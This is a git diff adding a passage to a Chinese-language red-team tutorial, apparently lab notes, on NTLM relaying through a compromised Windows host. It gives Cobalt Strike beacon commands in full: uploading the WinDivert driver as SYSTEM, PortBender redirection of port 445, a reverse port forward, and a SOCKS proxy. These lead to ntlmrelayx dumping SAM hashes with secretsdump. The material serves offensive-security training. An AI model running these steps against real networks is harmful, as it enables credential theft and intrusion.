@@ -258,4 +258,65 @@ kali通常使用[Responder](https://github.com/lgandx/Responder)和[ntlmrelayx](
 4. 需要 SOCKS 代理以允许 ntlmrelayx 将流量发送回目标网络
 
 流程图：
+
 ![alt NTLM Relaying](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/overview.png)
+
+
+把工具WinDivert64.sys上传到中转机器的```C:\Windows\System32\drivers```目录
+```
+beacon> getuid
+[*] You are NT AUTHORITY\SYSTEM (admin)
+
+beacon> pwd
+[*] Current directory is C:\Windows\system32\drivers
+
+beacon> upload C:\Tools\PortBender\WinDivert64.sys
+```
+
+
+
+[PortBender](https://github.com/praetorian-inc/PortBender)把445流量转到8445
+```
+beacon> PortBender redirect 445 8445
+[+] Launching PortBender module using reflective DLL injection
+Initializing PortBender in redirector mode
+Configuring redirection of connections targeting 445/TCP to 8445/TCP
+```
+
+使用rportfwd把8445端口转发到 Team Server的445端口
+```
+beacon> rportfwd 8445 127.0.0.1 445
+[+] started reverse port forward on 8445 to 127.0.0.1:445
+```
+
+建立代理连接
+```
+beacon> socks 1080
+[+] started SOCKS4a server on: 1080
+```
+
+
+在```WKSTN-2```，使用SMB流量访问```WKSTN-1```
+```
+H:\>hostname
+wkstn-2
+
+H:\>whoami
+dev\nlamb
+
+H:\>dir \\10.10.17.231\blah
+```
+
+
+PortBender 将记录连接
+
+```
+New connection from 10.10.17.132:50332 to 10.10.17.231:445
+Disconnect from 10.10.17.132:50332 to 10.10.17.231:445
+```
+
+
+```ntlmrelayx ```将使用[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py)转存hash
+
+
+![alt NTLM Relaying](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/dump-sam.png)
